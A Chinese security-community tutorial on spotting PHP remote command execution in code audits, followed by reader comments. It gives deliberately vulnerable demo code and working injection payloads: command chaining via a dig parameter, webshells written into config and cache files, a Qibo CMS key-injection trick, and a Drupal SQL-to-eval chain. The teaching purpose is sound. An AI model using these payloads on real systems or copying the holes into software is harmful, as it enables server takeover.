@@ -1,0 +1,167 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">说说RCE那些事儿</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">小飞</a> <span class="bull">·</span> <time title="2014/11/07 13:45" ui-time="" datetime="2014/11/07 13:45" class="published ng-binding ng-isolate-scope">2014/11/07 13:45</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x01 引言</h2><hr><p>如果OWASP给PHP漏洞弄个排行榜，那RCE（远程命令执行）绝对是最臭名昭著漏洞的前十名，其攻击方式灵活，且攻击成功后一般返回继承了web组件（如apache）权限的shell，危害自不必再多描述。那么，今天就来看看代码审计中到底该在哪里寻找命令执行？或者说，哪些功能会导致代码执行？</p><h2>0x02漏洞寻踪</h2><hr><p>这是一个最简单的命令执行漏洞</p><pre><code>#!php
+//index.php
+&lt;?php 
+$cmd=$_GET['cmd'];
+ system($cmd); ?&gt; 
+</code></pre><p>我们可以执行</p><pre><code>index.php?cmd=whoami 
+</code></pre><p>特别注意如果我们使用了</p><pre><code>#!php
+&lt;?php 
+$cmd=$_GET['cmd']; 
+echo exec($cmd); 
+?&gt;
+</code></pre><p>由于<code>exec()</code> 默认没有回显，所以执行命令之后 我们是看不到结果的， 当然我们能够通过重定向，把他们导入文件中，再来查询</p><p>当然这些代码一般情况下是不可能出现在程序中的，我们仅作了解。 那么…… 到底哪里会出现命令执行呢？</p><p><strong>Demo #1 实现查询dns的RCE</strong></p><p>这是一个实现查询dns命令的php程序片段，由于要和系统产生信息通道，使用了system()函数，过滤不严也导致了RCE。</p><pre><code>#!php
+&lt;?php
+
+    include("common.php");
+    showMenu();
+    echo '&lt;br&gt;';
+    $status = $_GET['status'];
+    $ns  = $_GET['ns'];
+    $host   = $_GET['host'];
+    $query_type   = $_GET['query_type']; // ANY, MX, A , etc.
+    $ip     = $_SERVER['REMOTE_ADDR'];
+    $self   = $_SERVER['PHP_SELF'];
+        $host = trim($host);
+          $host = strtolower($host);
+          echo("&lt;span class=\"plainBlue\"&gt;&lt;b&gt;Executing : &lt;u&gt;dig @$ns $host $query_type&lt;/u&gt;&lt;/b&gt;&lt;br&gt;");
+          echo '&lt;pre&gt;';
+          //start digging in the namserver
+          system ("dig @$ns $host $query_type");
+          echo '&lt;/pre&gt;';
+    } else {
+?&gt;
+</code></pre><p>如果我们请求</p><pre><code>dig.php?ns=whoam&amp;host=sirgod.net&amp;query_type=NS&amp;status=digging
+</code></pre><p>明显<code>system ("dig whoami sirgod.com NS");</code> 是不能执行的</p><p>所以我们用“||”分别执行linux命令</p><pre><code>dig.php?ns=||whoami||&amp;host=sirgod.net&amp;query_type=NS&amp;status=digging
+
+system ("dig ||whoami|| sirgod.net NS");
+</code></pre><p>那么我们就分离了dig命令和whoami 成功执行</p><p><strong>Demo #2 配置信息保存不当的RCE</strong></p><p>很多时候php的配置信息是直接保存在.php后缀的文件里面的 比如discuz 如果没有认真过滤…</p><pre><code>#!php
+  if(isset($action) &amp;&amp; $action == "setconfig") {
+    $config_file = "config.php";
+    $handle = fopen($config_file, 'w');
+    $StringData = "&lt;?php\r
+    $"."news_width = '".clean($_POST[news_width])."';\r
+    $"."bgcolor = '".clean($_POST[bgcolor])."';\r
+    $"."fgcolor = '".clean($_POST[fgcolor])."';\r
+    $"."padding = '".clean($_POST[padding])."';\r
+    $"."subject_margin = '".clean($_POST[subject_margin])."';\r
+    $"."fontname = '".clean($_POST[fontname])."';\r
+    $"."fontsize = '".clean($_POST[fontsize])."';\r\n?&gt;";
+    fwrite($handle, $StringData);
+  }
+</code></pre><p>那么如果正常提交 就是</p><pre><code>#!php
+&lt;?php 
+$news_width = '600px'; 
+$bgcolor = '#000000';
+$fgcolor = '#ffffff'; 
+$padding = '5px'; 
+$subject_margin = '0px'; 
+$fontname = 'verdana'; 
+$fontsize = '13px'; 
+?&gt;
+</code></pre><p>我们要是提交<code>';system($_GET['cmd']);'</code></p><p>配置文件就会变成</p><pre><code>#!php
+&lt;?php 
+$news_width = '';
+system($_GET['cmd']);
+'';
+ $bgcolor = '#000000';
+ $fgcolor = '#ffffff'; 
+$padding = '5px'; 
+$subject_margin = '0px'; 
+$fontname = 'verdana';
+ $fontsize = '13px'; 
+?&gt; 
+</code></pre><p>很明显这就是个合法的php文件了，也成为了一个webshell。</p><p><strong>Demo #2 缓存写入不当的RCE</strong></p><pre><code>#!php
+$newsfile = "news.txt"; 
+$file = fopen($newsfile, "r"); 
+..........................................................................
+ elseif ((isset($_REQUEST["title"])) &amp;&amp; (isset($_REQUEST["date"])) &amp;&amp;
+(isset($_REQUEST["post"])) &amp;&amp; ($_REQUEST["title"]!="") &amp;&amp;
+($_REQUEST["date"]!="") &amp;&amp; ($_REQUEST["post"]!="")) {
+$current_data = @fread($file, filesize($newsfile));
+fclose($file);
+$file = fopen($newsfile, "w");
+$_REQUEST["post"] = stripslashes(($_REQUEST["post"]));
+$_REQUEST["date"] = stripslashes(($_REQUEST["date"]));
+$_REQUEST["title"] = stripslashes(($_REQUEST["title"]));
+if(fwrite($file,$btable . " " . $btitle . " " . $_REQUEST["title"] . " " .  $etitle . " " . $bdate . " " . $_REQUEST["date"] . " " . $edate . " " . $bpost . " " . $_REQUEST["post"] . " " . $epost . " " . $etable . "\n " . $current_data))
+include 'inc/posted.html';
+else 
+include 'inc/error1.html'; 
+fclose($file);
+</code></pre><p>这个代码的业务功能就是写入缓存，是下次使用之前直接调用静态文件 如何显示给访客呢</p><pre><code>#!php
+&lt;? include("news.txt"); ?&gt;
+</code></pre><p>那么我们试试注入shell</p><pre><code>#!php
+&lt;table class='sn'&gt; &lt;tbody&gt; 
+&lt;tr&gt;&lt;td class='sn-title'&gt; 
+&lt;?php system($_GET['cmd']); ?&gt; 
+&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td class='sn-date'&gt; 
+Posted on: 08/06/2009 &lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td class='sn-post'&gt; test2 &lt;/td&gt;&lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt; &lt;table class='sn'&gt; &lt;tbody&gt; &lt;tr&gt;&lt;td class='sn-title'&gt; test &lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td class='sn-date'&gt; Posted on: 08/06/2009 &lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td class='sn-post'&gt; test &lt;/td&gt;&lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;
+</code></pre><p>访问display.php?cmd=whoami 成功执行</p><h2>0x03 实例剖析</h2><hr><p>有人就说了，上面代码是简单的phpdemo而已，实际环境中的审计肯定没有那么简单，那么，当我们面对完整的php程序，他们面对对象，基于各种框架，还怎么去寻找RCE的踪迹呢？</p><p>我们来看几个实例</p><p>齐博cms缓存写入导致远程代码执行 漏洞文件</p><pre><code>#!php
+foreach($label AS $key=&gt;$value){
+var_dump ($value);exit;//如果是新标签时,即为数组array(),要清空
+if(is_array($value))
+{
+$label[$key]='';
+}
+}
+//写缓存
+if( (time()-filemtime($FileName))&gt;($webdb[label_cache_time]*60) ){
+$_shows="&lt;?php\r\n\$haveCache=1;\r\n";
+
+foreach($label AS $key=&gt;$value){
+$value=addslashes($value);
+$_shows.="\$label['$key']=stripslashes('$value');\r\n";
+}
+write_file($FileName,$_shows.'?&gt;');
+} 
+}
+</code></pre><p>这段代码功能很好分析 遍历标签（$label）变量，并且写入缓存，</p><p>我们看看过滤函数</p><pre><code>#!php
+function Add_S($array){
+ foreach($array as $key=&gt;$value){
+if(!is_array($value)){
+@eregi("['\\\"&amp;]+",$key) &amp;&amp; die('ERROR KEY!');
+$value=str_replace("&amp;#x","&amp; # x",$value); //过滤一些不安全字符
+$value=preg_replace("/eval/i","eva l",$value); //过滤不安全函数
+!get_magic_quotes_gpc() &amp;&amp; $value=addslashes($value);
+$array[$key]=$value;
+}else{
+$array[$key]=Add_S($array[$key]); 
+}
+}
+return $array;
+}
+</code></pre><p>这里检测key的机制就出问题,,我画了个图</p><p><img alt="enter image description here" img-src="4e03141e2406d0f2ca046bfd1bb02b1c553248c6.jpg"></p><p>简而言之，他只检测最底层的key 所以我们提交<code>label[evilcode][asd]=xx</code> 匹配的key是asd 那么就不会被匹配出 evilcode就不会被检测。</p><p>由于qibo是 伪全局</p><pre><code>#!php
+foreach($_POST AS $_key=&gt;$_value){
+!ereg("^\_[A-Z]+",$_key) &amp;&amp; $$_key=$_POST[$_key];
+}
+foreach($_GET AS $_key=&gt;$_value){
+!ereg("^\_[A-Z]+",$_key) &amp;&amp; $$_key=$_GET[$_key];
+}
+</code></pre><p>会帮我们注册好提交的变量 所以$label是能够直接控制的</p><p>那么也就是当我们提交</p><pre><code>#!php
+label['.phpinfo().'][asd]=sb
+</code></pre><p>提交的key为<code>''.phpinfo().''</code> 那么写入的本地文件就是</p><pre><code>#!php
+\$label[''.phpinfo().'']=stripslashes();\r\n"; 
+</code></pre><p><img alt="enter image description here" img-src="e7649d4a396e5aed65ac84adcd8a427449fd0523.jpg"></p><p>这时所有引号全都闭合</p><p>缓存文件夹中也就写入了我们的shell</p><p><strong>Drupal函数回调导致的RCE</strong></p><p>Drupal作为世界上公认最强大的phpweb框架，一直在追求更安全的开发方法 比如，它采用预编译的方法进行SQL交互，使得SQL注入漏洞几乎难以挖掘。然而在近期，由于一个功能中将SQL预编译权利交给了用户。</p><pre><code>#!php
+$query = preg_replace('#' . $key . '\b#', implode(', ', array_keys($new_keys)), $query);
+</code></pre><p><strong>插入用户输入数据导致sql注入</strong></p><p>又由于drupal采用的PDO是支持多行的，所以能执行任意语句，当然这不是今天的重点。 今天我们看看如何漏洞扩大，把SQLI变成RCE 首先讲下<code>call_user_func_array</code></p><p>(PHP 4 >= 4.0.4, PHP 5)</p><p>调用回调函数，并把一个数组参数作为回调函数的参数 说明</p><pre><code>#!php
+mixed call_user_func_array ( callable $callback , array $param_arr )
+
+
+$preferred_links = &amp;drupal_static(__FUNCTION__); 
+ If (!isset($path)) {    $path = $_GET['q'];  }
+</code></pre><p>首先$path作为变量是可控的</p><pre><code>#!php
+function menu_execute_active_handler($path = NULL, $deliver = TRUE) {
+ $page_callback_result = _menu_site_is_offline() ? MENU_SITE_OFFLINE : MENU_SITE_ONLINE; 
+$read_only_path = !empty($path) ? $path : $_GET['q']; drupal_alter('menu_site_status', $page_callback_result, $read_only_path); 
+if ($page_callback_result == MENU_SITE_ONLINE) { 
+         if ($router_item = menu_get_item($path)) {
+              if ($router_item['access']) { 
+                   if ($router_item['include_file']) { 
+require_once DRUPAL_ROOT . '/' . $router_item['include_file']; } $page_callback_result = call_user_func_array($router_item['page_callback'], $router_item['page_arguments']);
+ } else { $page_callback_result = MENU_ACCESS_DENIED; 
+} } else { $page_callback_result = MENU_NOT_FOUND; } } }
+
+if ($router_item['include_file']) { require_once DRUPAL_ROOT . '/' . $router_item['include_file']; }
+</code></pre><p>包含了文件</p><p><strong>通过预编译注入向表中插入一个语句</strong></p><pre><code>#!php
+insert into menu_router (path, page_callback, access_callback, include_file) values ('&lt;?php phpinfo();?&gt;','eval', '1', 'modules/php/php.module');
+</code></pre><p>path 为要执行的代码； include&#95;file 为 PHP filter Module 的路径； page&#95;callback 为 eval； access_callback 为 1（可以让任意用户访问）。 访问地址即可造成 RCE。</p><p><img alt="enter image description here" img-src="5d8dea26591f309578433a98d461d1adf4af5e1f.jpg"></p><h2>0x04 写在最后</h2><hr><p>一般来讲，漏洞形成的原因基本都是“数据与代码未有效分离”，然而RCE是个例外，往往出现rce的地方本来就是供程序执行代码的地方，加上如今php程序功能越来越强大，各种地方相互调用，导致组合利用漏洞。所以程序员写起代码来往往都不知道改怎么去防御，或者说防不胜防。 由于其漏洞实现的灵活性，寻找RCE，还是应该从功能入手，去研究代码实现了什么功能，最后变量进入什么函数，被如何调用，而不是简简单单的去进行关键字搜索，毕竟，如今代码审计已经从“哪里有洞”过渡到“如何绕过”的时代了。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">dmst</span> <span class="reply-time">2015-05-26 10:33:48</span></div><p></p><p>好文章，赞！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">鸟</span> <span class="reply-time">2015-01-27 15:11:48</span></div><p></p><p>好文章</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">wcl17</span> <span class="reply-time">2014-12-01 10:46:52</span></div><p></p><p>那个齐博就是写出来被人轮X的吧？ 想起那个猎人与熊的故事了。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">GixMore</span> <span class="reply-time">2014-11-12 00:17:00</span></div><p></p><p>从“哪里有洞”过渡到“如何绕过”</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2014-11-10 19:02:36</span></div><p></p><p>支持一下</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">园长</span> <span class="reply-time">2014-11-09 19:01:21</span></div><p></p><p>赞！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">蒙塔基的钢弹</span> <span class="reply-time">2014-11-09 16:48:51</span></div><p></p><p>受益匪浅啊，那对于PHP框架，如CI那种的审计有啥好经验吗</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ricter</span> <span class="reply-time">2014-11-07 17:59:59</span></div><p></p><p>你知道吗，那个意识形态里放满了工口网站</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">noob</span> <span class="reply-time">2014-11-07 17:43:06</span></div><p></p><p>赞</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Knight</span> <span class="reply-time">2014-11-07 17:31:53</span></div><p></p><p>你也有强迫症么？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Knight</span> <span class="reply-time">2014-11-07 17:30:51</span></div><p></p><p>dig.php?ns=whoam&amp;host=sirgod.net&amp;query_type=NS&amp;status=digging<br>打错了。是<br>dig.php?ns=whoami&amp;host=sirgod.net&amp;query_type=NS&amp;status=digging</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">刘海哥</span> <span class="reply-time">2014-11-07 17:24:40</span></div><p></p><p>good！！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">梧桐雨</span> <span class="reply-time">2014-11-07 16:50:11</span></div><p></p><p>dig.php?ns=whoam&amp;host=sirgod.net&amp;query_type=NS&amp;status=digging</p><p>应该是<br>dig.php?ns=whoami&amp;host=sirgod.net&amp;query_type=NS&amp;status=digging<br>？漏了一个字符</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">depycode</span> <span class="reply-time">2014-11-07 16:25:23</span></div><p></p><p>看你这头像有种错觉！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">迦南</span> <span class="reply-time">2014-11-07 15:55:01</span></div><p></p><p>看完点赞，要回复，这是尊重</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2014-11-07 15:30:27</span></div><p></p><p>收藏得多 回复得少</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小飞</span> <span class="reply-time">2014-11-07 15:30:23</span></div><p></p><p>谢谢你。。。好害怕0回复。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hkAssassin</span> <span class="reply-time">2014-11-07 15:25:04</span></div><p></p><p>好文章，消灭0回复……</p><p></p></div></div></div></div></div></main>
